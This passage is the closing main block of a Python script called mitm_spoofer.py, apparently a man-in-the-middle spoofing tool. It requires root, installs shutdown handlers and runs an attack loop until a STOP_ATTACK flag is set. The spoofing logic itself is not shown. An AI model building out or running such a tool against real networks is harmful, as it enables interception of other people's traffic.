    # Must run as root for raw sockets and iptables
    if os.geteuid() != 0:
        print("[!] Run as root: sudo python3 mitm_spoofer.py ...")
        sys.exit(1)
    
    # Set up signal handlers for clean shutdown
    signal.signal(signal.SIGINT, lambda s, f: cleanup())   # Ctrl+C
    signal.signal(signal.SIGTERM, lambda s, f: cleanup())  # kill command
    
    try:
        setup_and_run()
        # Keep main thread alive
        while not STOP_ATTACK:
            time.sleep(1)
    except KeyboardInterrupt:
        cleanup()
    except Exception as e:
        print(f"[!] Error: {e}")
        traceback.print_exc()
        cleanup()
